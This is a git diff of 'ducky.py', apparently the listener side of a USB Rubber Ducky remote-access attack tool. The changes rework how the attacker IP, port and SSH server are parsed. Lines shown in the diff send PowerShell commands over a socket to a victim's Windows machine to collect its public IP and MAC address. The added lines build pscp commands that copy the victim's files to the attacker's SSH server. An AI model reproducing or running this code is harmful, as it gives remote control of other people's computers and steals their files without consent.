@@ -1,7 +1,8 @@
 #!/usr/bin/python3
 # ducky.py
 # Ashish D'Souza
-# January 6th, 2019
+# January 8th, 2019
+
 import socket
 import threading
 import os
@@ -22,7 +23,12 @@ def recv(conn):
 
 
 if "-ip" in sys.argv:
-    attacker_ip = sys.argv[sys.argv.index("-ip") + 1]
+    attacker_ip = sys.argv[sys.argv.index("-ip") + 1].split(":")[0]
+    attacker_port = sys.argv[sys.argv.index("-ip") + 1].split(":")[1]
+    if "-ssh" in sys.argv:
+        ssh_address = sys.argv[sys.argv.index("-ssh") + 1]
+    else:
+        ssh_address = input("SSH Server Address >> ")
 else:
     if sys.platform[:5] == "linux" or sys.platform == "darwin":
         attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
@@ -31,10 +37,12 @@ else:
     else:
         print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
         attacker_ip = input("Manual entry is required >> ")
-if "-ssh" in sys.argv:
-    ssh_address = sys.argv[sys.argv.index("-ssh") + 1]
-else:
-    ssh_address = input("SSH Server Address >> ")
+    attacker_port = port
+    ssh_address = "localhost:22"
+ssh_ip = ssh_address.split(":")[0]
+ssh_port = ssh_address.split(":")[1]
+if ssh_ip.lower() == "localhost" or ssh_ip == "127.0.0.1":
+    ssh_ip = attacker_ip
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -60,8 +68,8 @@ print("IP Address:            " + ip)
 conn.send("(new-object net.webclient).downloadstring('http://ipecho.net/plain')".encode())
 public_ip = conn.recv(1024).decode().strip()
 print("Public IP Address:     " + public_ip)
-port = str(addr[1])
-print("Port:                  " + port)
+victim_port = str(addr[1])
+print("Port:                  " + victim_port)
 conn.send("getmac | findstr Device | foreach-object{$_.split(\" \")[0]}\n".encode())
 mac = conn.recv(1024).decode().split("\n")[0]
 print("MAC Address:           " + mac)
@@ -158,7 +166,7 @@ while not stop:
             if "-ip" in options or "-a" in options:
                 print("IP Address:             " + ip)
             if "-port" in options or "-a" in options:
-                print("Port:                   " + port)
+                print("Port:                   " + victim_port)
             if "-m" in options or "-a" in options:
                 print("MAC Address:            " + mac)
             if "-n" in options or "-a" in options:
@@ -193,10 +201,10 @@ while not stop:
             commands = []
             if ducky_command[7:9] == "-r":
                 filename = ducky_command[10:]
-                commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_address.split(":")[1] + " -pw '" + getpass("Password >> ") + "' -scp -r " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_address.split(":")[0] + ":" + os.getcwd() + "/scp")
+                commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_port + " -pw '" + getpass("Password >> ") + "' -scp -r " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_ip + ":" + os.getcwd() + "/scp")
             else:
                 filename = ducky_command[7:]
-                commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_address.split(":")[1] + " -pw '" + getpass("Password >> ") + "' -scp " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_address.split(":")[0] + ":" + os.getcwd() + "/scp")
+                commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_port + " -pw '" + getpass("Password >> ") + "' -scp " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_ip + ":" + os.getcwd() + "/scp")
             stdin = "; ".join(commands)
         elif ducky_command[:8] == "rickroll":
             commands = []
